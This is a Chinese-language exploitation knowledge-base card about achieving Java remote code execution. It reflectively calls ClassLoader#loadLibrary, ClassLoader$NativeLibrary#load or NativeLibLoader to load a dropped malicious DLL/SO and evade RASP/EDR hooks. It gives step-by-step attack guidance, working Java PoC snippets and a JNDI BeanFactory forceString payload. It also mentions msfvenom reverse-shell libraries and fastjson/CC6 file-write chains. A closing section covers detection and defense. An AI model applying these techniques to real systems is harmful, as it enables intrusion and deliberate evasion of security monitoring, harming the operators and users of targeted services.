---
id: web-java-rce-reflect-classloader-nativelibrary-load-dll-bypass-hooks
title: 反射调用 ClassLoader#loadLibrary / ClassLoader$NativeLibrary#load 加载本地 DLL/SO：绕开 Runtime/System 的 RASP、EDR 与查杀 hook，配合写文件能力完成落地执行
type: scenario
domain: web
path: web/java/rce
technique: reflect-classloader-nativelibrary-load-native-lib-bypass-rasp
aliases:
- 反射调用 ClassLoader.loadLibrary 加载 dll
- ClassLoader$NativeLibrary load 反射
- NativeLibLoader 加载动态链接库
- 绕过 System/Runtime 检测加载 dll
- 写文件后用 TemplatesImpl 字节码加载 dll
tags:
- java
- rce
- native-library
- dll
- so
- classloader
- reflection
- rasp-bypass
- jndi
- deserialization
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W9
  verified_at: '2026-11-09T03:37:49+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文。System.load→Runtime.load0→ClassLoader.loadLibrary(true 分支)→loadLibrary0/NativeLibrary.load 调用链、NativeLibLoader 最终走 System.load、两段反射加载代码、CC6 写文件、fastjson 1.2.68 写文件 position 约束、JNDI ResourceRef+forceString 均与正文一致；载荷侧 DllMain/JNI_OnLoad/constructor 为合理延伸并与既有三张载荷卡互链。dedup 首候选为自身，外部候选(Job InvokeTarget 0.125/RASP 通防 0.112)非同链。未验证点：原文自评 JNDI 路径『似乎没有什么用』未在卡内显式标注；PoC 未执行。原文无受影响版本，未 set-versions。
---

## 一句话结论

当目标有 RASP、主机 EDR 或 webshell 查杀，`Runtime.exec`/`System.load` 这类"明确 API"会被 hook 告警时，可以改用反射直接调用 `java.lang.ClassLoader#loadLibrary(Class, String, boolean)`，甚至实例化内部类 `ClassLoader$NativeLibrary` 再调它的 `load(String, boolean)`，把已落地的 DLL/SO 映射进 JVM 执行；`com.sun.glass.utils.NativeLibLoader#loadLibrary` 是另一条"看起来不像危险 API"的入口。这条链把"任意文件写"（CC6 写文件、fastjson 写文件、JNDI BeanFactory forceString）与"反射加载原生库"拼成完整 RCE，且不经过 `System`/`Runtime` 的高危调用点。

## 原理

- **`System.load` 的调用栈**：`System.load(path)` → `Runtime.getRuntime().load0(fromClass, filename)` → `ClassLoader.loadLibrary(fromClass, filename, true)`（第三个参数为绝对路径标记）。因此"加载本地库"的最终落点是 `ClassLoader.loadLibrary`，`System`/`Runtime` 只是外层门面。
- **反射绕开 API 级监控**：RASP/EDR 的 Java 层 hook 通常埋在 `Runtime.exec`、`ProcessBuilder.start`、`System.load/loadLibrary` 这些固定方法的入口处。反射调用 `ClassLoader.loadLibrary` 与 `NativeLibrary.load` 时不经过这些被监控的方法体，堆栈里也不会出现 `System.load` 帧，因此按"方法名/调用点"匹配的规则失效；对只做字节码增强（instrumentation）的白名单式 RASP，命中率进一步下降。
- **`NativeLibrary` 是内部静态类**：`java.lang.ClassLoader$NativeLibrary` 的构造器 `(Class, String, boolean)` 可反射取得，实例化后调 `load(String, boolean)` 即完成 `dlopen`/`LoadLibrary`，效果与 `System.load` 等价（它本身就是 `ClassLoader.loadLibrary0` 里被创建的对象）。
- **`NativeLibLoader` 是"伪装"入口**：JDK 自带的 `com.sun.glass.utils.NativeLibLoader.loadLibrary(name)` 最终也调到 `System.load`，但对只监控业务常见 API、或按"调用来源模块"做判断的检测规则来说，它的调用栈比直接 `System.load` 更"正常"（JDK 图形栈内部加载库）。
- **为什么要配写文件**：以上只是"加载"原语，需要目标上存在可控的原生库文件。因此完整链是"任意文件写 → 落地 DLL/SO → 反射加载"。原文给出的三条落地方式：CC6 链（`InvokerTransformer` 拼 `FileOutputStream` 写文件）、fastjson 1.2.68 的 `AutoCloseable→SafeFileOutputStream+kryo Output+SerialOutput` 写文件、以及 JNDI 的 `ResourceRef` + Tomcat `BeanFactory` 的 `forceString=a=loadLibrary` 直接调 `NativeLibLoader`。
- **为什么可行**：原生库的入口点（`DllMain` 的 `DLL_PROCESS_ATTACH`、`.init_array`/`__attribute__((constructor))`、`JNI_OnLoad`）在库被映射时自动执行，不需要导出 `Java_` 符号、不需要目标类声明 native 方法；加载动作本身又是 JVM 合法能力，只要绕开"看门"的那一层，就没有语义层面的拦截点。

## 触发条件

- 目标 JVM 上存在可控的原生库落地路径：任意文件写（反序列化链写文件、模板/上传/日志写入、fastjson 写文件 gadget、JNDI 工厂写文件等），或能把文件写进 `java.library.path`。
- 目标操作系统与库架构匹配（Windows x64 DLL / Linux x86_64 SO 等），且库文件路径可读可执行（Linux 上还需 `dlopen` 权限，注意 `noexec` 挂载）。
- 目标有 Java 层 RASP/EDR 但只按常用 API 名做 hook，未对 `ClassLoader.loadLibrary`、`ClassLoader$NativeLibrary#load`、`NativeLibLoader.loadLibrary` 做同等监控。
- 攻击者能构造对应的反序列化/表达式/模板入口来执行上述反射代码（CC 链、fastjson、TemplatesImpl、JNDI 均可）。

## 利用步骤

1. 先确认可用入口与写文件能力：反序列化是否可写文件（CC6 的 `FileOutputStream` 链、fastjson 1.2.68 写文件链），或 JNDI 是否可打到 Tomcat `BeanFactory`。
2. 准备原生库：Linux 用 `__attribute__((constructor))` 或 `JNI_OnLoad` 实现载荷编译成 `.so`；Windows 用 `DllMain` 的 `DLL_PROCESS_ATTACH` 分支实现载荷编译成 `.dll`；也可用 `msfvenom -f dll`/`-f elf-so` 生成反弹 shell 库（注意 payload 体积与目标解码方式）。
3. 落地：用写文件链把库写到可预测路径（如 `d:/calc_x64.dll` 或 `/tmp/libcmd.so`）。
4. 加载（三选一）：
   - 反射 `ClassLoader#loadLibrary`：`getDeclaredMethod("loadLibrary", Class.class, String.class, boolean.class)` → `invoke(null, Class.class, "/abs/path/calc.dll", true)`；
   - 反射 `NativeLibrary`：`Class.forName("java.lang.ClassLoader$NativeLibrary")` → `getDeclaredConstructor(Class.class, String.class, boolean.class)` → `newInstance(Class.class, path, true)` → `getDeclaredMethod("load", String.class, boolean.class)` → `invoke(obj, path, false)`；
   - `com.sun.glass.utils.NativeLibLoader.loadLibrary("<相对名>")`（会依赖库搜索路径）。
5. 若加载代码需要以字节码形式投递（例如前面只有 TemplatesImpl 可用），把加载逻辑写进 translet 的静态块/构造函数，再走 `TemplatesImpl` 触发。
6. 通过 JNDI 侧投递时，用 `ResourceRef` 把 `factoryClassName` 指向本地 `org.apache.naming.factory.BeanFactory`、`factoryClassLocation` 留空（过 JDK 高版本 `decodeObject` 检查），`forceString=a=loadLibrary`，属性 `a` 填库路径。

## PoC

反射调用 `ClassLoader#loadLibrary`（绝对路径，第三参数 `true`）：

```java
Class<?> cl = Class.forName("java.lang.ClassLoader");
Method m = cl.getDeclaredMethod("loadLibrary", Class.class, String.class, boolean.class);
m.setAccessible(true);
m.invoke(null, cl, "d:/calc_x64.dll", true);
```

反射实例化 `ClassLoader$NativeLibrary` 并调用 `load`：

```java
String file = "/tmp/libcmd.so";
Class<?> a = Class.forName("java.lang.ClassLoader$NativeLibrary");
Constructor<?> con = a.getDeclaredConstructor(Class.class, String.class, boolean.class);
con.setAccessible(true);
Object lib = con.newInstance(Class.class, file, true);
Method load = lib.getClass().getDeclaredMethod("load", String.class, boolean.class);
load.setAccessible(true);
load.invoke(lib, file, false);
```

JNDI 侧把"加载"做成 BeanFactory 的属性方法（`ResourceRef` + `forceString`）：

```java
ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
        true, "org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
ref.add(new StringRefAddr("a", "../../../../calc_x64"));
// 绑定到 RMI/LDAP，诱导目标 InitialContext.lookup 后由 BeanFactory 反射调用 loadLibrary
```

写文件侧的库载荷投放（CC6 版本的关键一步是用 `InvokerTransformer` 依次调用 `FileOutputStream` 的构造器、`write(byte[])`、`close()`，把本地 DLL 内容写到目标路径；fastjson 1.2.68 版本则用 `SafeFileOutputStream` 作 `targetPath`、`kryo.io.Output` 提供 `buffer`/`position`、`SerialOutput` 触发 `close`，注意 `position` 必须等于 DLL 解码后的字节数，否则文件被截断）。

## 变体与关联

- **加载入口变体**：`ClassLoader.loadLibrary`、`ClassLoader$NativeLibrary.load`、`NativeLibLoader.loadLibrary`、`JNA` 的 `Native.load`、`org.scijava.nativelib` 等第三方加载器；任何"最终走到 `dlopen` 但栈上不出现 `System.load`"的入口都等价。
- **落地方式变体**：任意文件写（CC/CommonsBeanutils/fastjson/JNDI 工厂/模板引擎/上传）都可，甚至只写"已存在库的替换"（如覆盖临时目录下 JNA 解包的库，见 `pentest-privilege-escalation-jna-tmpdir-native-lib-replacement`）。
- **载荷变体**：`DllMain`/`.init_array` 构造函数式（加载即执行，无需 JNI 符号）、`JNI_OnLoad` 导出式（JVM 主动调用）、正常导出 `Java_` 方法（需要业务调用点）；也可以只加载一个只有 `DllMain` 的"加载器"，再由它反射/内存加载更复杂的 payload。
- **关联**：`web-java-rce-jni-onload-export-load-time-exec`、`web-java-rce-windows-dllmain-load-time-exec`、`web-java-rce-elf-constructor-load-time-exec`（三条都是"库被加载即执行"的载荷侧，本卡补的是"加载动作本身怎么绕过监控"）、`web-java-rce-job-invoketarget-whitelist-suffix-system-load-so`（另一条把 `System.load` 送进 `Job InvokeTarget` 的入口）、`web-java-deser-fastjson-1268-autocloseable-expectclass-file-rw`（fastjson 写文件的落地侧）。
- **边界**：目标禁用 `setAccessible`（强模块封装且未做 `--add-opens`，JDK17+ 对 `java.lang` 的反射限制）、RASP 对 `native` 加载做了系统调用级监控（`dlopen`/`LoadLibrary` 的 seccomp/EDR 内核回调）、库文件无法落地或落在 `noexec` 分区、库架构不匹配时，该链不成立；此外原生库落地必然留文件痕迹，隐蔽性不如纯内存马。

## 检测与防御

- **检测**：JVM 侧监控 `ClassLoader.loadLibrary`、`ClassLoader$NativeLibrary#load`、`com.sun.glass.utils.NativeLibLoader` 的反射调用（可通过 RASP 在这些方法上布点，而非只布 `System.load`）；`setAccessible(true)` 调用私有 JDK 方法的堆栈；进程出现 `dlopen`/`LoadLibrary` 但没有对应的 `System.load` 日志；临时目录/应用目录出现新增 `.dll`/`.so` 且随后被同一 JVM 进程映射（`/proc/<pid>/maps` 新增匿名或临时路径映射）；`msfvenom` 特征段（`.text` 高熵、导出表只有 `DllMain`/`JNI_OnLoad`）。
- **防御**：把安全监控下沉到 `dlopen`/`LoadLibrary` 系统调用与文件映射层（EDR 内核回调），不要只依赖 Java 方法名 hook；启用 JDK 强封装并对反射私有成员打点告警；应用层禁止任何"可控路径的库加载"（白名单 + 哈希/签名校验后才 `System.load`）；限制应用目录与临时目录的可执行挂载（`noexec`）并禁止上传可执行格式；对反序列化入口与写文件 sink 做根因治理，使攻击者拿不到"任意文件写"这一步。
